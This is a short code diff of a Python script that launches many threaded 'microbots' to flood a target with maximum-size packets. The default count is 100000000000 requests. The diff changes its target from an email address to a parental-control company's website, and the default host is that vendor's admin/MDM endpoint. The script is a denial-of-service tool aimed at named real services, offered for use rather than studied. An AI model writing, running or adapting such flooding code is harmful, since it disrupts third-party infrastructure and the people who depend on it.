@@ -9,7 +9,7 @@ def ping_server(host, count=100000000000, packet_size=65500, bot_id=1):
         host (str): The server or domain to ping (e.g., "34.120.115.37").
         count (int): Number of requests to send (default is 100000000000).
         packet_size (int): Size of the packet to simulate (in bytes).
-        bot_id (int): The ID for this microbot.
+        bot_id (int): The uID for this microbot.
     Returns:
         None
     """
@@ -37,4 +37,4 @@ def start_microbots(num_bots, host="https://admin.kdlparentalcontrol.com/mdm", p
         thread.join()
 
 if __name__ == "__main__":
-    start_microbots(100000000000, "pxxh4hhx7x@privaterelay.appleid.com", 0.1, 65500)
+    start_microbots(100000000000, "https://kidslox.com", 0.1, 65500)
